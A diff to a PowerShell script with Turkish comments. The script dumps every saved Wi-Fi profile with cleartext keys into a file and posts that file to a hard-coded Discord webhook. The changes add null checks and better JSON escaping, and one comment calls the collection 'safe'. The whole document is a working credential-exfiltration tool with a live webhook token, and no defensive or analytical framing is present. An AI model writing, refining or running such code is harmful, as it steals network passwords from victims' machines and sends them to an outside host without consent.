@@ -1,25 +1,32 @@
-# Profil isimlerini al
+# Wi-Fi profillerini güvenli şekilde alalım
 $profiles = netsh wlan show profiles | Where-Object { $_ -match 'All User Profile' } | ForEach-Object {
-    ($_ -split ':')[1].Trim()
+    $parts = $_ -split ':'
+    if ($parts.Length -gt 1) {
+        $parts[1].Trim()
+    }
 }
 
 $outputFile = "$env:USERPROFILE\wifipass.txt"
-Remove-Item $outputFile -ErrorAction SilentlyContinue
+if (Test-Path $outputFile) { Remove-Item $outputFile }
 
-# Her profilin detayını yaz
 foreach ($profile in $profiles) {
-    netsh wlan show profile name="$profile" key=clear | Out-File -Append $outputFile
+    # Profil boş veya null ise atla
+    if (![string]::IsNullOrEmpty($profile)) {
+        netsh wlan show profile name="$profile" key=clear | Out-File -Append $outputFile
+    }
 }
 
-# Discord webhook URL'si
+# Webhook URL
 $webhookUrl = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'
 
-# Dosya içeriğini oku ve escape et
+# Dosya içeriğini oku
 $fileContent = Get-Content $outputFile -Raw
-$escapedContent = $fileContent -replace '"','\"'
 
-# JSON payload'u oluştur
+# JSON'da özel karakterlerden kaçalım
+$escapedContent = $fileContent -replace '\\', '\\\\' -replace '"', '\"' -replace "`r`n", "`n"
+
+# JSON payload'u elle oluştur
 $payload = '{ "content": "```' + $escapedContent + '```" }'
 
-# Discord'a POST et
+# İsteği gönder
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
